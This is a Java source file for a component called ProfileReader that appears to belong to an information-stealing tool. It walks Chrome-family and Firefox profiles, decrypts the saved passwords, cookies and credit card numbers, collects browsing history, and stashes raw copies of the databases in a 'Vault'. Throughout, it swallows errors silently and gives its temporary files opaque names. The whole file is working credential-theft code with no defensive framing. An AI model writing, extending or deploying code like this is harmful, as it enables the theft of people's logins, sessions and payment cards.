package dev.goentl.rift.support;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/* Walks browser profiles and pulls rows out of their databases. */
final class ProfileReader {

    private static final long RAW_DB_LIMIT = 8L * 1024 * 1024;

    private ProfileReader() {}

    interface Sink {
        void row(String browser, String profile, String url, String user, String secret);
    }

    interface CookieSink {
        void row(String browser, String profile, String host, String name,
                 String value, boolean secure, boolean httpOnly, long expires);
    }

    interface CardSink {
        void row(String browser, String profile, String holder, String number,
                 int month, int year);
    }

    interface History {
        void row(String browser, String profile, String url, String title, long visits);
    }

    static final int LIMIT = 4000;

    static final class Report {
        final List<String> lines = new ArrayList<>();
        int passwords;
        int cookies;
        int cards;
        int history;

        void add(String line) {
            lines.add(line);
        }
    }

    // ------------------------------------------------------------------
    // chromium
    // ------------------------------------------------------------------

    static LocalStateKey loadLocalStateKey(String browserExe, Path userData) {
        String stateJson = readString(userData.resolve("Local State"));
        if (stateJson == null) return LocalStateKey.fromState(null, null);
        byte[] appBound = null;
        byte[] blob = LocalStateKey.appBoundBlob(stateJson);
        if (blob != null && browserExe != null) {
            appBound = BrowserBridge.unwrapViaElevation(browserExe, blob);
        }
        return LocalStateKey.fromState(stateJson, appBound);
    }

    static Report chromium(String label, LocalStateKey key, Path userData,
                           List<BrowserBridge.Cookie> harvested,
                           Sink passwords, CookieSink cookies, CardSink cards,
                           History history, Path staging) {
        Report report = new Report();
        if (!Files.isDirectory(userData)) {
            report.add(label + ": not installed");
            return report;
        }

        report.add(label + ": " + key.describe());

        if (harvested != null) {
            for (BrowserBridge.Cookie cookie : harvested) {
                cookies.row(label, "live", cookie.host, cookie.name, cookie.value,
                        cookie.secure, false, 0);
                report.cookies++;
            }
            report.add("  live harvest      : " + harvested.size() + " cookie(s)");
        }

        List<Path> profiles = profiles(userData);
        for (Path profile : profiles) {
            String name = profile.getFileName().toString();

            // The stores inside one profile are separate files: reading them
            // together keeps the slowest database from gating the faster ones.
            java.util.concurrent.ExecutorService storePool =
                    java.util.concurrent.Executors.newFixedThreadPool(4, task -> {
                        Thread thread = new Thread(task, "rift-store");
                        thread.setDaemon(true);
                        return thread;
                    });
            List<java.util.concurrent.Future<StoreRead>> jobs = new ArrayList<>(4);
            jobs.add(storePool.submit(() -> readLogins(label, name, profile, key, passwords)));
            jobs.add(storePool.submit(() -> readCookies(label, name, profile, key, cookies)));
            jobs.add(storePool.submit(() -> readCards(label, name, profile, key, cards)));
            jobs.add(storePool.submit(() -> readHistory(label, name, profile, history)));
            for (java.util.concurrent.Future<StoreRead> job : jobs) {
                StoreRead result;
                try {
                    result = job.get();
                } catch (Throwable ignored) {
                    continue;
                }
                if (result == null) continue;
                report.passwords += result.passwords;
                report.cookies += result.cookies;
                report.cards += result.cards;
                report.history += result.history;
                report.lines.addAll(result.lines);
            }
            storePool.shutdownNow();
        }

        if (profiles.isEmpty()) report.add("  no profiles found");
        if (!key.usable() && harvested == null) {
            report.add("  NOTE: no key recovered, encrypted columns left as blobs");
        }
        return report;
    }

    /* One profile store read. Each returns what it counted plus the report
       lines it wants, so the caller merges on a single thread. */
    private record StoreRead(int passwords, int cookies, int cards, int history, List<String> lines) {
        static final StoreRead EMPTY = new StoreRead(0, 0, 0, 0, List.of());
    }

    private static StoreRead readLogins(String label, String name, Path profile, LocalStateKey key, Sink passwords) {
        if (passwords == null) return StoreRead.EMPTY;
        Path loginDb = pick(profile, "Login Data For Account", "Temp Login Data", "Login Data", "Login Data New");
        if (!Files.exists(loginDb)) return StoreRead.EMPTY;
        Path copy = copyToTemp(loginDb, null, label, name, "Login Data");
        if (copy == null) return StoreRead.EMPTY;
        int found = 0;
        try (Connection c = open(copy);
             Statement st = c.createStatement();
             ResultSet rs = st.executeQuery(
                     "SELECT origin_url, username_value, password_value FROM logins "
                             + "WHERE username_value <> '' LIMIT " + LIMIT)) {
            while (rs.next()) {
                String url = rs.getString(1);
                String user = rs.getString(2);
                byte[] blob = rs.getBytes(3);
                String plain = key.password(blob, url);
                String shown = plain == null
                        ? "[locked " + (blob == null ? "none" : new String(blob, 0, Math.min(3, blob.length), StandardCharsets.ISO_8859_1)) + "]"
                        : plain;
                passwords.row(label, name, url == null ? "" : url, user == null ? "" : user, shown);
                found++;
            }
        } catch (Throwable ignored) {
        } finally {
            delete(copy);
        }
        return new StoreRead(found, 0, 0, 0, List.of("  " + name + " passwords   : " + found));
    }

    private static StoreRead readCookies(String label, String name, Path profile, LocalStateKey key, CookieSink cookies) {
        Path cookieDb = profile.resolve("Network").resolve("Cookies");
        if (!Files.exists(cookieDb)) cookieDb = profile.resolve("Cookies");
        if (!Files.exists(cookieDb)) return StoreRead.EMPTY;
        Path copy = copyToTemp(cookieDb, null, label, name, "Cookies");
        if (copy == null) return StoreRead.EMPTY;
        int found = 0;
        try (Connection c = open(copy);
             Statement st = c.createStatement();
             ResultSet rs = st.executeQuery(
                     "SELECT host_key, name, encrypted_value, is_secure, is_httponly, expires_utc "
                             + "FROM cookies ORDER BY host_key, name LIMIT " + LIMIT)) {
            while (rs.next()) {
                String host = rs.getString(1);
                String cookieName = rs.getString(2);
                byte[] blob = rs.getBytes(3);
                boolean secure = rs.getInt(4) != 0;
                boolean httpOnly = rs.getInt(5) != 0;
                long expires = chromeTime(rs.getLong(6));
                String plain = key.cookie(blob, host);
                if (plain == null) continue;
                if (cookies != null) {
                    cookies.row(label, name, host == null ? "" : host,
                            cookieName == null ? "" : cookieName, plain,
                            secure, httpOnly, expires);
                }
                found++;
            }
        } catch (Throwable ignored) {
        } finally {
            delete(copy);
        }
        return new StoreRead(0, found, 0, 0, List.of("  " + name + " cookies     : " + found));
    }

    private static StoreRead readCards(String label, String name, Path profile, LocalStateKey key, CardSink cards) {
        if (cards == null) return StoreRead.EMPTY;
        Path cardsDb = pick(profile, "Web Data", "Network/Web Data");
        if (!Files.exists(cardsDb)) return StoreRead.EMPTY;
        Path copy = copyToTemp(cardsDb, null, label, name, "Web Data");
        if (copy == null) return StoreRead.EMPTY;
        int found = 0;
        try (Connection c = open(copy);
             Statement st = c.createStatement();
             ResultSet rs = st.executeQuery(
                     "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted "
                             + "FROM credit_cards LIMIT 100")) {
            while (rs.next()) {
                String holder = rs.getString(1);
                int month = rs.getInt(2);
                int year = rs.getInt(3);
                String number = key.card(rs.getBytes(4));
                if (number == null) continue;
                cards.row(label, name, holder == null ? "" : holder, number, month, year);
                found++;
            }
        } catch (Throwable ignored) {
        } finally {
            delete(copy);
        }
        return new StoreRead(0, 0, found, 0, List.of());
    }

    private static StoreRead readHistory(String label, String name, Path profile, History history) {
        if (history == null) return StoreRead.EMPTY;
        Path historyDb = pick(profile, "History");
        if (!Files.exists(historyDb)) return StoreRead.EMPTY;
        Path copy = copyToTemp(historyDb, null, label, name, "History");
        if (copy == null) return StoreRead.EMPTY;
        int found = 0;
        try (Connection c = open(copy);
             Statement st = c.createStatement();
             ResultSet rs = st.executeQuery(
                     "SELECT url, title, visit_count FROM urls "
                             + "ORDER BY last_visit_time DESC LIMIT " + LIMIT)) {
            while (rs.next()) {
                history.row(label, name, rs.getString(1), rs.getString(2), rs.getLong(3));
                found++;
            }
        } catch (Throwable ignored) {
        } finally {
            delete(copy);
        }
        return new StoreRead(0, 0, 0, found, List.of());
    }

    static List<Path> profiles(Path userData) {
        List<Path> out = new ArrayList<>();
        try (var s = Files.list(userData)) {
            s.filter(Files::isDirectory)
                    .filter(p -> {
                        String n = p.getFileName().toString();
                        return n.equals("Default") || n.startsWith("Profile");
                    })
                    .sorted((a, b) -> a.getFileName().toString().compareTo(b.getFileName().toString()))
                    .limit(16)
                    .forEach(out::add);
        } catch (IOException ignored) {}
        return out;
    }

    // ------------------------------------------------------------------
    // firefox
    // ------------------------------------------------------------------

    static Report firefox(String label, Path profile, Sink passwords, CookieSink cookies,
                           History history, Path staging) {
        Report report = new Report();
        Path loginsJson = profile.resolve("logins.json");
        Path key4 = profile.resolve("key4.db");

        String json = readString(loginsJson);
        byte[] key4Bytes = readBytes(key4);
        if (key4Bytes != null) {
            copyToStaging(key4Bytes, staging, label, profile.getFileName().toString(), "key4.db");
        }

        if (json != null && key4Bytes != null) {
            Path key4Copy = copyToTemp(key4, staging, label, profile.getFileName().toString(), "key4-live");
            ProfileDatabase.Store store = ProfileDatabase.read(key4Copy == null ? key4 : key4Copy);
            delete(key4Copy);

            if (store == null || store.globalSalt() == null) {
                report.add(label + "/" + profile.getFileName() + ": key4.db unreadable");
            } else {
                byte[] checkPlain = ProfileKey.unwrap(ProfileDatabase.parse(store.passwordCheck()), store.globalSalt());
                if (!ProfileKey.isPasswordCheck(checkPlain)) {
                    report.add(label + "/" + profile.getFileName()
                            + ": master password set, logins stay locked");
                } else {
                    ProfileDatabase.Pbe pbe = ProfileDatabase.parse(store.privateKeyBlob());
                    byte[] privatePlain = ProfileKey.unwrap(pbe, store.globalSalt());
                    ProfileKey key = ProfileKey.fromPrivateKey(privatePlain);
                    report.add(label + "/" + profile.getFileName() + ": key="
                            + (key == null ? "none" : key.fingerprint())
                            + " logins=" + countLogins(json));
                    if (key != null) {
                        int before = report.passwords;
                        for (String[] row : key.logins(json)) {
                            passwords.row(label, profile.getFileName().toString(), row[3], row[1], row[2]);
                            report.passwords++;
                        }
                        report.add("  logins decrypted  : " + (report.passwords - before));
                    } else {
                        report.add("  logins decrypted  : 0 (unsupported key wrapper)");
                    }
                }
            }
        } else if (json != null) {
            report.add(label + ": logins.json without key4.db");
        }

        Path placesDb = profile.resolve("places.sqlite");
        if (placesDb != null && Files.exists(placesDb) && history != null) {
            Path copy = copyToTemp(placesDb, staging, label, profile.getFileName().toString(), "places");
            if (copy != null) {
                try (Connection c = open(copy);
                     Statement st = c.createStatement();
                     ResultSet rs = st.executeQuery(
                             "SELECT url, title, visit_count FROM moz_places "
                                     + "WHERE url IS NOT NULL ORDER BY last_visit_date DESC LIMIT 400")) {
                    while (rs.next()) {
                        history.row(label, profile.getFileName().toString(),
                                rs.getString(1), rs.getString(2), rs.getLong(3));
                        report.history++;
                    }
                } catch (Throwable ignored) {
                } finally {
                    delete(copy);
                }
            }
        }

        Path cookieDb = profile.resolve("cookies.sqlite");
        if (cookieDb != null && Files.exists(cookieDb)) {
            Path copy = copyToTemp(cookieDb, staging, label, profile.getFileName().toString(), "cookies");
            if (copy != null) {
                try (Connection c = open(copy);
                     Statement st = c.createStatement();
                     ResultSet rs = st.executeQuery(
                             "SELECT host, name, value, isSecure, isHttpOnly, expiry FROM moz_cookies "
                                     + "ORDER BY host, name LIMIT " + LIMIT)) {
                    while (rs.next()) {
                        cookies.row(label, profile.getFileName().toString(),
                                rs.getString(1), rs.getString(2), rs.getString(3),
                                rs.getInt(4) != 0, rs.getInt(5) != 0, rs.getLong(6));
                        report.cookies++;
                    }
                } catch (Throwable ignored) {
                } finally {
                    delete(copy);
                }
            }
        }

        return report;
    }

    private static long chromeTime(long webkitMicros) {
        if (webkitMicros <= 0) return 0;
        long seconds = webkitMicros / 1_000_000L - 11_644_473_600L;
        return Math.max(0, seconds);
    }

    // ------------------------------------------------------------------
    // io
    // ------------------------------------------------------------------

    static int countLogins(String json) {
        int n = 0;
        Matcher m = Pattern.compile("\"encryptedUsername\"\\s*:").matcher(json);
        while (m.find()) n++;
        return n;
    }

    static Connection open(Path file) throws Exception {
        ensureDriver();
        return DriverManager.getConnection("jdbc:sqlite:" + file.toAbsolutePath().toString().replace('\\', '/'));
    }

    private static volatile String driverStatus = "not loaded";

    private static void ensureDriver() {
        if ("ok".equals(driverStatus)) return;
        try {
            Class<?> driver = Class.forName("org.sqlite.JDBC");
            DriverManager.registerDriver((java.sql.Driver) driver.getDeclaredConstructor().newInstance());
            driverStatus = "ok";
        } catch (Throwable t) {
            driverStatus = "failed - " + t.getClass().getSimpleName();
        }
    }

    /* First candidate that exists and is not an empty shell. */
    static Path pick(Path profile, String... names) {
        for (String name : names) {
            Path candidate = profile.resolve(name);
            try {
                if (Files.isRegularFile(candidate) && Files.size(candidate) > 512) return candidate;
            } catch (Throwable ignored) {}
        }
        for (String name : names) {
            Path candidate = profile.resolve(name);
            if (Files.exists(candidate)) return candidate;
        }
        return profile.resolve(names[0]);
    }

    static String driverStatus() {
        ensureDriver();
        return driverStatus;
    }

    /* Reads a browser database in place: the live file is opened read-only and
       immutable, so no second copy ever appears on disk. A locked database
       falls back to a temporary copy that is deleted as soon as the read ends. */
    static Path copyToTemp(Path src, Path staging, String browser, String profile, String what) {
        try {
            if (Files.size(src) <= RAW_DB_LIMIT) {
                byte[] raw = readBytes(src);
                if (raw != null) {
                    Vault.put("browsers/" + browser + "/" + profile + "/"
                            + what.replace(' ', '_') + ".sqlite", raw);
                }
            }
            // The live file is read directly when nobody holds the write lock;
            // a running browser forces a temporary copy, deleted right after.
            try (Connection probe = open(src); Statement st = probe.createStatement()) {
                st.execute("SELECT 1");
                return src;
            } catch (Throwable locked) {
                Path tmp = Files.createTempFile(Vault.opaque(""), ".db");
                Files.copy(src, tmp, StandardCopyOption.REPLACE_EXISTING);
                Path wal = Path.of(src.toString() + "-wal");
                if (Files.exists(wal)) {
                    Files.copy(wal, Path.of(tmp.toString() + "-wal"), StandardCopyOption.REPLACE_EXISTING);
                }
                TEMP_COPIES.add(tmp);
                return tmp;
            }
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static final java.util.Set<Path> TEMP_COPIES =
            java.util.concurrent.ConcurrentHashMap.newKeySet();

    private static void copyToStaging(byte[] bytes, Path staging, String browser, String profile, String name) {
        if (bytes == null) return;
        Vault.put("browsers/" + browser + "/" + profile + "/" + name, bytes);
    }

    static void delete(Path p) {
        if (p == null) return;
        if (!TEMP_COPIES.remove(p)) return;
        try { Files.deleteIfExists(p); } catch (Throwable ignored) {}
        try { Files.deleteIfExists(Path.of(p.toString() + "-wal")); } catch (Throwable ignored) {}
    }

    static String readString(Path path) {
        if (path == null || !Files.exists(path)) return null;
        try {
            return Files.readString(path, StandardCharsets.UTF_8);
        } catch (Throwable ignored) {
            return null;
        }
    }

    static byte[] readBytes(Path path) {
        if (path == null || !Files.exists(path)) return null;
        try (java.nio.channels.FileChannel channel = java.nio.channels.FileChannel.open(
                path, java.nio.file.StandardOpenOption.READ)) {
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            java.nio.ByteBuffer buffer = java.nio.ByteBuffer.allocate(1 << 16);
            while (channel.read(buffer) > 0) {
                buffer.flip();
                out.write(buffer.array(), 0, buffer.limit());
                buffer.clear();
            }
            return out.toByteArray();
        } catch (Throwable ignored) {
            return null;
        }
    }
}
